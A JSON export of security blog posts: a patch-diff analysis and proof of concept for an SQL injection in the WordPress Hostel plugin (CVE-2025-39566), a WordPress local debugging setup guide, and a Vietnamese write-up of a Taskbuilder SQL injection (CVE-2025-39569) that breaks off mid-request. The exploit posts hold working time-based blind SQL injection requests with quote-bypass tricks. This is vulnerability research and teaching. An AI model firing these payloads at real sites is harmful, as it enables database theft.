[{"content":"A vulnerability in the Hostel plugin prior to version 1.1.5.7. Because input is not sanitized properly, this may allow an attacker to interact directly with the database, including but not limited to data exfiltration.\nCVE ID: CVE-2025-39566 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 1.1.5.6 CVSS severity: 7.6 (High) Required Privilege: Administrator Requirements Local WordPress and Debugging Hostel Plugin: v1.1.5.6 (vulnerable) and v1.1.5.7 (fixed) diff tool: meld or any tool capable of comparing two versions to show differences Analysis The root cause is that the application injects data from a GET request directly into an SQL query while the validation/whitelisting is insufficient.\nPatch Diff Use any diff tool to compare the vulnerable version and the patched version. A clear difference exists in the file controllers/bookings.php\nVulnerable version:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } Patched version:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) { $ob = sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]); if(!in_array($ob, [\u0026#39;tB.id\u0026#39;, \u0026#39;tB.contact_name\u0026#39;, \u0026#39;tB.contact_email\u0026#39;, \u0026#39;tB.from_date\u0026#39;, \u0026#39;tB.amount_paid\u0026#39;, \u0026#39;tB.status\u0026#39;])) { $ob = \u0026#39;tB.id\u0026#39;; } $orderby = \u0026#34;ORDER BY $ob $dir\u0026#34;; } üëâ The patch uses a whitelist to restrict which columns can be used for ordering; if the supplied value is not valid it falls back to 'tB.id'.\nAnalysis: The vulnerability appears because the ob parameter is passed directly into the ORDER BY clause after sanitize_text_field(). That function only escapes/cleans text for HTML contexts and does not validate or filter for SQL injection in an SQL context.\nHow it works To inject, we need to identify the complete query used here:\n$bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); The query resides in the default branch of the switch structure.\nAll this logic belongs to the static manage() method of the WPHostelBookings class.\nclass WPHostelBookings { static function manage() { global $wpdb; $_booking = new WPHostelBooking(); switch(@$_GET[\u0026#39;do\u0026#39;]) { case \u0026#39;add\u0026#39;: // add handle break; case \u0026#39;edit\u0026#39;: // edit handle break; // view/print booking details. Will allow also to confirm/cancel case \u0026#39;view\u0026#39;: // view handle\tbreak;\t// list bookings default: // another logic if(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } $bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); // another logic break; } } } In WordPress, plugins communicate with core via the Plugin API (Hook System). Therefore, to find where manage() is invoked, we can search for the string \u0026quot;manage\u0026quot; in the plugin folder.\nIn the file models/hostel.php we have:\nclass class WPHostel { // another logic static function menu() { // we use \u0026#39;hostelpro_manage\u0026#39; for consistency with the pro version $wphostel_caps = current_user_can(\u0026#39;manage_options\u0026#39;) ? \u0026#39;manage_options\u0026#39; : \u0026#39;hostelpro_manage\u0026#39;; add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_rooms\u0026#39;, array(\u0026#39;WPHostelRooms\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_unavailable\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;unavailable\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_emaillog\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;email_log\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_help\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;index\u0026#34;)); } // another logic } Here:\nadd_menu_page() creates the main menu in the Admin Dashboard. add_submenu_page() adds submenu items under that menu. The $callback parameter is the callback function invoked when a user clicks the menu/submenu. Example:\n// add_menu_page($page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;, $icon_url = \u0026#39;\u0026#39;, $position = null); add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); // add_submenu_page($parent_slug, $page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); // array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); =\u0026gt; WPHostelBookings::manage() All these menu/submenu items are registered inside the static menu() method of the WPHostel class. To locate where menu() is called, search for the menu hook in the plugin directory.\nIn the plugin root file hostel.php we have:\nadd_action(\u0026#39;admin_menu\u0026#39;, array(\u0026#34;WPHostel\u0026#34;, \u0026#34;menu\u0026#34;)); // =\u0026gt; callback: WPHostel::menu() add_action() is the WordPress Plugin API that attaches a callback to an action hook. The hook name here is admin_menu, meaning WPHostel::menu() will be called during the lifecycle when WordPress builds the Admin Dashboard Menu. Menu in the Admin UI\nDebugging\nThe faulty functionality is in the Booking Manager, so navigate to the Manage Bookings submenu in the Admin UI.\nRight before the default branch there is a comment // list bookings ‚Äî indicating this code handles listing and ordering bookings.\nOpen your debugger:\nClick Run with Debugger. Set a breakpoint at the switch branch that contains the vulnerable code and at the exact line that assigns the vulnerable value. When you click a column header in the bookings table, observe:\nThe debugger steps into the switch. Use Step Over to reach the default branch. Continue Step Over and inspect variables in Variables \u0026gt; Locals. These variables combine to form the SQL query below. After combining the variables, the full query looks like:\nSELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM wp_hostel_bookings tB JOIN wp_hostel_rooms tR ON tR.id = tB.room_id WHERE is_static=0 AND tB.id = ... ORDER BY tB.amount_paid ASC|DESC LIMIT ... Notably, the $orderby variable is assigned as:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } ‚ö†Ô∏è Issues here:\nThe part after ORDER BY uses sanitize_text_field(). That function only cleans HTML, and does not validate or filter input to make it safe in an SQL context. Therefore the ob parameter (provided by the user) can be abused to inject SQL directly. Exploit Detecting SQLi Request with BurpSuite:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=upcoming\u0026amp;ob=tB.status,(SELECT+SLEEP(10))\u0026amp;dir=ASC HTTP/1.1 We separate the ORDER BY clause with a comma because it accepts multi-column values.\nResult: the response time is delayed ‚Üí SQL Injection succeeded.\nDumping Data from the Database Bypass ' using ORD():\nTo dump database data we need to extract characters such as the first character of the database name.\nBecause sanitize_text_field() removes single quotes ('), we cannot use payloads relying on '. Instead, use ORD() to compare character ASCII codes:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(ORD(SUBSTRING(DATABASE(),1,1))=119,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 Bypass succeeds ‚Üí we can extract the database name.\nBypass ' using Hex encoding (alternative)\nBesides ORD() we can use Hex encoding to bypass:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 Bypass succeeds ‚Üí database name can be extracted.\nConclusion The vulnerability CVE-2025-39566 in the WordPress Hostel plugin (versions prior to 1.1.5.7) stems from inserting user-supplied input directly into an SQL query without adequate safeguards, leading to SQL Injection.\nKey takeaways:\nsanitize_text_field() ‚â† protection against SQL Injection Distinguish clearly between input cleaning for HTML contexts and validation/sanitization for SQL contexts References SQL Injection Cheat Sheet ‚Äì PortSwigger\nWordPress Hostel Plugin \u0026lt;= 1.1.5.6 is vulnerable to SQL Injection - patchstack\n","permalink":"//localhost:1313/posts/2025-09-21-cve-2025-39566/","summary":"\u003cp\u003eA vulnerability in the \u003cstrong\u003eHostel\u003c/strong\u003e plugin prior to version \u003cstrong\u003e1.1.5.7\u003c/strong\u003e. Because input is not sanitized properly, this may allow an attacker to interact directly with the database, including but not limited to data exfiltration.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-39566\"\u003eCVE-2025-39566\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/hostel/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.1.5.6\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: 7.6 (High)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Administrator\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/blog/posts/2025-09-20-wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eHostel Plugin\u003c/strong\u003e: v1.1.5.6 (vulnerable) and v1.1.5.7 (fixed)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e or any tool capable of comparing two versions to show differences\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eThe root cause is that the application injects data from a \u003cstrong\u003eGET\u003c/strong\u003e request directly into an SQL query while the validation/whitelisting is insufficient.\u003c/p\u003e","title":"CVE-2025-39566 Analysis \u0026 POC"},{"content":"WordPress is a powerful and the most popular content management system (CMS) that allows you to create, manage, and customize websites and blogs easily. It‚Äôs an open-source CMS, built on PHP, and uses either MySQL or MariaDB databases.\nReleased in 2003, initially as a blogging platform, later evolved into a full-featured system for websites, online stores, forums, landing pages, etc. Today, more than 40% of websites worldwide run on WordPress. There are two versions of WordPress:\nWordPress.com\nHosting service provided by Automattic You only need to register an account, no installation required Limited customization, advanced features require payment WordPress.org\nOpen-source, you download and install it on your own hosting/server Full customization, install plugins, themes, write code, build any website you want Ecosystem Core: The main CMS Plugins: Add-on software installed on a WordPress site to extend functionality and add new features Themes: Add-on software that defines the visual appearance and layout of a WordPress site Why WordPress Hacking? State of WordPress Security in 2024\nMost Popular Currently, over 40% of all websites worldwide run WordPress This means hackers only need to find one common vulnerability =\u0026gt; they can exploit millions of sites at once Like the saying: ‚Äúfish where the fish are‚Äù Plugin and Theme WordPress Core has been reviewed for a long time by thousands of developers and researchers, making it difficult for attackers to break in However, tens of thousands of plugins and themes from various sources are in use, with inconsistent quality Many plugins have poor security code or are no longer updated. Hackers only need to scan plugins/themes for outdated versions and exploit them Setup WordPress for Hacking There are many ways to set up WordPress; searching on Google will show plenty of guides. Here, I‚Äôll set it up on an Ubuntu (22.04) virtual machine:\nNo effect on the host machine‚Äôs services WordPress is lightweight enough to run in a VM Install and Configure WordPress Install Dependencies Install the full stack needed to run WordPress (web server + database + PHP + required extensions).\nsudo apt install apache2 \\ ghostscript \\ libapache2-mod-php \\ mysql-server \\ php \\ php-bcmath \\ php-curl \\ php-imagick \\ php-intl \\ php-json \\ php-mbstring \\ php-mysql \\ php-xml \\ php-zip Install WordPress Download and install WordPress source code into the web directory.\n# Create a folder to store the website source code sudo mkdir -p /srv/www # Change owner to www-data, the default user for Apache/Nginx web server sudo chown www-data: /srv/www # Download the latest WordPress package from the official site # Extract it into /srv/www curl https://wordpress.org/latest.tar.gz | sudo -u www-data tar zx -C /srv/www To download a specific version:\ncurl https://wordpress.org/wordpress-6.6.2.tar.gz | sudo -u www-data tar zx -C /srv/www Installing from wordpress.org is the most reliable method:\nUbuntu provides a wordpress package in its repo, but it‚Äôs usually outdated compared to the official release. The WordPress community only supports the official release. If you encounter issues with the Ubuntu package, they won‚Äôt help. Configure Apache for WordPress Create /etc/apache2/sites-available/wordpress.conf:\n\u0026lt;VirtualHost *:80\u0026gt; DocumentRoot /srv/www/wordpress \u0026lt;Directory /srv/www/wordpress\u0026gt; Options FollowSymLinks AllowOverride Limit Options FileInfo DirectoryIndex index.php Require all granted \u0026lt;/Directory\u0026gt; \u0026lt;Directory /srv/www/wordpress/wp-content\u0026gt; Options FollowSymLinks Require all granted \u0026lt;/Directory\u0026gt; \u0026lt;/VirtualHost\u0026gt; Enable WordPress site:\nsudo a2ensite wordpress Enable mod_rewrite:\nsudo a2enmod rewrite Disable default site (optional):\nsudo a2dissite 000-default Or add ServerName mywordpress.local in VirtualHost and update your system‚Äôs hosts file.\nReload Apache:\nsudo service apache2 reload Configure Database Open MySQL:\nsudo mysql -u root Create DB and user:\nCREATE DATABASE wordpress; CREATE USER wordpress@localhost IDENTIFIED BY \u0026#39;\u0026lt;your-password\u0026gt;\u0026#39;; GRANT SELECT,INSERT,UPDATE,DELETE,CREATE,DROP,ALTER ON wordpress.* TO wordpress@localhost; FLUSH PRIVILEGES; quit Restart MySQL:\nsudo service mysql start Configure WordPress DB Connection Copy and edit config:\nsudo -u www-data cp /srv/www/wordpress/wp-config-sample.php /srv/www/wordpress/wp-config.php Update DB info:\nsudo -u www-data sed -i \u0026#39;s/database_name_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/username_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/password_here/\u0026lt;your-password\u0026gt;/\u0026#39; /srv/www/wordpress/wp-config.php Add secret keys/salts from: https://api.wordpress.org/secret-key/1.1/salt/\nConfigure WordPress Visit http://localhost and set site title, username, password, email for the admin user.\nSetup Debug on VSCode To understand request flow, we need debugging.\nAdd PHP Debug Extension In VS Code Extensions (Ctrl+Shift+X) =\u0026gt; search PHP Debug (by Felix Becker) =\u0026gt; Install.\nInstall Xdebug sudo apt install php-xdebug -y php -v If you see with Xdebug v3.x.x, installation is OK.\nConfigure Xdebug Edit php.ini:\nzend_extension=xdebug.so xdebug.mode=debug xdebug.start_with_request=yes xdebug.client_host=127.0.0.1 xdebug.client_port=9003 Restart Apache:\nsudo systemctl restart apache2 Configure VSCode launch.json Open project in VS Code:\ncode /srv/www/wordpress Add launch.json:\n{ \u0026#34;version\u0026#34;: \u0026#34;0.2.0\u0026#34;, \u0026#34;configurations\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;Listen for Xdebug\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;php\u0026#34;, \u0026#34;request\u0026#34;: \u0026#34;launch\u0026#34;, \u0026#34;port\u0026#34;: 9003, \u0026#34;pathMappings\u0026#34;: { \u0026#34;/srv/www/wordpress\u0026#34;: \u0026#34;${workspaceFolder}\u0026#34; } } ] } Now WordPress is fully set up locally with VS Code debugging.\nExtend Required Version Each WordPress version requires a compatible PHP version. Check this to avoid setup errors.\nWordPress Auto Update Since WordPress 3.7 (2013), background automatic updates exist for:\nSecurity releases Maintenance releases Not for major versions (unless explicitly enabled) WordPress checks api.wordpress.org for updates and applies them automatically.\nTo disable auto-updates, add in wp-config.php:\ndefine( \u0026#39;WP_AUTO_UPDATE_CORE\u0026#39;, false ); Increase Uploadable Plugin Size By default, WordPress relies on PHP configuration (upload_max_filesize, post_max_size, and sometimes max_execution_time) to determine the maximum file size that can be uploaded. On many servers, this limit is set as low as 2MB ‚Äì 8MB, which is not enough for modern plugins.\nWhy Increase the Limit? Large plugins: Some plugins such as WooCommerce extensions, page builders, backup tools, or security suites can easily reach 20MB ‚Äì 100MB.\nAvoid errors: If the plugin .zip file exceeds the limit, you‚Äôll see errors like:\n‚ÄúThe uploaded file exceeds the upload_max_filesize directive in php.ini‚Äù Or the upload process fails silently. Ease of use: Increasing the limit allows administrators to upload plugins directly from the WordPress Dashboard without needing FTP/SSH access.\nDevelopment and testing: Developers testing their own plugins (with bundled assets like JS, CSS, images, or libraries) may generate larger .zip files. A higher limit makes local testing smoother.\nHow to Increase Plugin Upload Size There are several methods depending on your hosting environment:\nEdit php.ini (if you control the server)\nupload_max_filesize = 64M post_max_size = 64M max_execution_time = 300 Edit .htaccess (for Apache servers)\nphp_value upload_max_filesize 64M php_value post_max_size 64M php_value max_execution_time 300 php_value max_input_time 300 Update wp-config.php Add before the line /* That's all, stop editing! Happy publishing. */:\n@ini_set( \u0026#39;upload_max_filesize\u0026#39; , \u0026#39;64M\u0026#39; ); @ini_set( \u0026#39;post_max_size\u0026#39;, \u0026#39;64M\u0026#39;); @ini_set( \u0026#39;max_execution_time\u0026#39;, \u0026#39;300\u0026#39; ); üëâ It‚Äôs recommended to set a reasonable value (e.g., 64MB or 128MB). Avoid setting it too high (hundreds of MBs), as it may open the door to abuse (e.g., users uploading excessively large files that overload the server).\n","permalink":"//localhost:1313/posts/2025-09-20-wordpress-local-and-debugging/","summary":"\u003cp\u003e\u003cstrong\u003eWordPress\u003c/strong\u003e is a powerful and the most popular content management system (CMS) that allows you to create, manage, and customize websites and blogs easily. It‚Äôs an open-source CMS, built on PHP, and uses either MySQL or MariaDB databases.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eReleased in 2003, initially as a blogging platform, later evolved into a full-featured system for websites, online stores, forums, landing pages, etc.\u003c/li\u003e\n\u003cli\u003eToday, more than 40% of websites worldwide run on WordPress.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eThere are two versions of WordPress:\u003c/p\u003e","title":"WordPress Local and Debugging"},{"content":"Introduction L·ªó h·ªïng x·∫£y ra tr√™n plugin Taskbuilder c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n 4.0.2. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\nCVE ID: CVE-2025-39569 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt; 4.0.2 CVSS severity: High (8.5) Required Privilege: Subscriber Requirements Local WordPress and Debugging Taskbuilder Plugin: v4.0.1(vul) v√† v4.0.2(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Analysis ·ª®ng d·ª•ng ƒë√£ x·ª≠ l√Ω d·ªØ li·ªáu ƒë·∫ßu v√†o tr∆∞·ªõc khi ƒë∆∞a v√†o c√¢u SQL. Tuy nhi√™n, trong qu√° tr√¨nh x√¢y d·ª±ng truy v·∫•n, gi√° tr·ªã n√†y ƒë∆∞·ª£c ch√®n tr·ª±c ti·∫øp m√† kh√¥ng ƒë∆∞·ª£c bao trong d·∫•u nh√°y ƒë∆°n '...'. ƒêi·ªÅu ƒë√≥ khi·∫øn k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ ch√®n th√™m c√°c th√†nh ph·∫ßn c√∫ ph√°p SQL h·ª£p l·ªá (nh∆∞ OR, AND,...) v√†o truy v·∫•n, d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.\nPatch Diff D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü file includes/admin/projects/get_users.php\nTrong phi√™n b·∫£n v4.0.1, bi·∫øn $proj_id sau khi escape ƒë∆∞·ª£c ƒë∆∞a th·∫≥ng v√†o c√¢u truy v·∫•n m√† kh√¥ng c√≥ d·∫•u nh√°y ƒë∆°n bao quanh:\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row( \u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project where id = $proj_id\u0026#34; ); {: file=\u0026ldquo;includes/admin/projects/get_users.php v4.0.1\u0026rdquo; }\n·ªû b·∫£n v4.0.2, truy v·∫•n ƒë√£ ƒë∆∞·ª£c ƒëi·ªÅu ch·ªânh b·∫±ng c√°ch ƒë·∫∑t $proj_id trong d·∫•u nh√°y ƒë∆°n sau khi escape:\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row( \u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project where id = \u0026#39;$proj_id\u0026#39;\u0026#34; ); {: file=\u0026ldquo;includes/admin/projects/get_users.php v4.0.2\u0026rdquo; }\nB·∫£n v√° n√†y ƒë·∫£m b·∫£o r·∫±ng gi√° tr·ªã $proj_id sau khi escape ƒë∆∞·ª£c coi l√† m·ªôt chu·ªói literal, kh√¥ng th·ªÉ tho√°t ra kh·ªèi d·∫•u nh√°y ƒë∆°n ƒë·ªÉ ch√®n th√™m c√∫ ph√°p SQL, qua ƒë√≥ ngƒÉn ch·∫∑n t·∫•n c√¥ng SQL Injection.\nHow it work? File architecture:\nC·∫•u tr√∫c chung c·ªßa file hi·ªán t·∫°i\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row(\u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project WHERE id = $proj_id\u0026#34;); // B·∫Øt ƒë·∫ßu buffer ƒë·ªÉ t·∫°o n·ªôi dung ch√≠nh (body) c·ªßa modal ob_start(); // ... render HTML danh s√°ch users $body = ob_get_clean(); // B·∫Øt ƒë·∫ßu buffer ƒë·ªÉ t·∫°o ph·∫ßn footer c·ªßa modal ob_start(); // ... render HTML c√°c n√∫t thao t√°c (Close, Save) $footer = ob_get_clean(); // Tr·∫£ d·ªØ li·ªáu JSON ƒë·ªÉ frontend hi·ªÉn th·ªã modal echo json_encode([ \u0026#39;body\u0026#39; =\u0026gt; $body, \u0026#39;footer\u0026#39; =\u0026gt; $footer, ]); {: file=\u0026ldquo;includes/admin/projects/get_users.php v4.0.1\u0026rdquo; }\n$proj_id / $project: L·∫•y d·ªØ li·ªáu project t·ª´ database. ob_start() / ob_get_clean(): Ghi HTML ra buffer thay v√¨ xu·∫•t tr·ª±c ti·∫øp, gi√∫p gom n·ªôi dung v√†o bi·∫øn. $body / $footer: Ch·ª©a n·ªôi dung HTML ƒë·ªông c·ªßa modal. json_encode(): Tr·∫£ JSON cho client, c√≥ kh·∫£ nƒÉng ƒë∆∞·ª£c s·ª≠ d·ª•ng trong Ajax ƒë·ªÉ hi·ªÉn th·ªã modal m√† kh√¥ng c·∫ßn refresh trang. File n·∫±m trong th∆∞ m·ª•c includes cho th·∫•y r·∫±ng n√≥ s·∫Ω ƒë∆∞·ª£c g·ªçi ·ªü 1 ch·ª©c nƒÉng n√†o ƒë√≥ ·ªü n∆°i kh√°c. ƒê·ªÉ bi·∫øt ch·ª©c nƒÉng n√†o s·ª≠ d·ª•ng n√≥, ta t√¨m ki·∫øm v·ªõi t·ª´ kh√≥a get_users.php trong th∆∞ m·ª•c ch·ª©a plugin.\nüëâ N√≥ ƒë∆∞·ª£c include trong h√†m wppm_get_users() c·ªßa class WPPM_Admin trong file class-wppm-admin.php. wppm_get_users() l√† callback c·ªßa action hook trong WordPress.\nWPPM_Admin construct:\nfinal class WPPM_Admin { // constructor public function __construct() { // other action add_action( \u0026#39;wp_ajax_wppm_get_users\u0026#39;,array($this,\u0026#39;wppm_get_users\u0026#39;)); // array($this,\u0026#39;wppm_get_users\u0026#39;)) = $this::wppm_get_users() // other action } } {: file=\u0026ldquo;includes/class-wppm-admin.php v4.0.1\u0026rdquo; }\nadd_action() l√† m·ªôt Plugin API c·ªßa WordPress, cho ph√©p g·∫Øn m·ªôt callback v√†o m·ªôt action hook. wp_ajax_wppm_get_users l√† t√™n hook Ajax, v·ªõi quy t·∫Øc ƒë·∫∑t t√™n: wp_ajax_{action} =\u0026gt; X·ª≠ l√Ω Ajax khi user ƒë√£ ƒëƒÉng nh·∫≠p. wp_ajax_nopriv_{action} =\u0026gt; X·ª≠ l√Ω Ajax khi user ch∆∞a ƒëƒÉng nh·∫≠p. ·ªû ƒë√¢y, action = wppm_get_users. Nghƒ©a l√† n·∫øu trong Ajax request b·∫°n g·ª≠i action=wppm_get_users t·ªõi admin-ajax.php, th√¨ WordPress s·∫Ω t√¨m callback t∆∞∆°ng ·ª©ng ƒë·ªÉ x·ª≠ l√Ω, ·ªü ƒë√¢y l√† wppm_get_users(). üëâ Ta ƒë√£ bi·∫øt ƒë∆∞·ª£c action = wppm_get_users, ki·ªÉm tra xem Ajax n√†o s·ª≠ d·ª•ng action n√†y b·∫±ng c√°ch t√¨m t·ª´ kh√≥a wppm_get_users tr√™n c√°c file .js trong th∆∞ m·ª•c ch·ª©a plugin.\nAction wppm_get_users l√† ph·∫ßn data trong request POST c·ªßa h√†m wppm_get_users()\nH√†m wppm_get_users() s·∫Ω ƒë∆∞·ª£c ƒë·∫∑t trong HTML attribute c·ªßa ch·ª©c nƒÉng project\nT·∫°o project m·ªõi Truy c·∫≠p v√†o project ƒë√≥ Inspect code v√† t√¨m h√†m wppm_get_users s·∫Ω ƒë∆∞·ª£c ƒë·∫∑t ·ªü ƒë√¢u, h√†nh ƒë·ªông n√†o s·∫Ω g·ªçi n√≥ üëâ Khi click v√†o icon b√™n c·∫°nh Users ajax s·∫Ω ho·∫°t ƒë·ªông, g·ª≠i request ƒë·∫øn server, l·∫•y danh s√°ch c√°c user tham gia project v√† m√£ HTML hi·ªÉn th·ªã n√≥.\nExploit Detect SQLi B·∫Øt request b·∫±ng BurpSuite, g·ª≠i request v·ªõi SQLi payload time base\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+SLEEP(1)) Th·ªùi gian ph·∫£n h·ªìi b·ªã delay =\u0026gt; SQL Injection th√†nh c√¥ng.\nGet First Letter of Database Name ƒêi·ªÅu ki·ªán ti√™n quy·∫øt ƒë·ªÉ dump ƒë∆∞·ª£c h·∫øt data l√† ph·∫£i dump ƒë∆∞·ª£c 1 k√Ω t·ª± b·∫•t k·ª≥ c·ªßa t√™n database, n·∫øu l·∫•y ƒë∆∞·ª£c th√¨ to√†n b·ªô data ƒë·ªÅu dump ƒë∆∞·ª£c.\nG·ª≠i request v·ªõi SQLi payload boolean base v√≥i proj_id ƒë√∫ng:\nPOST 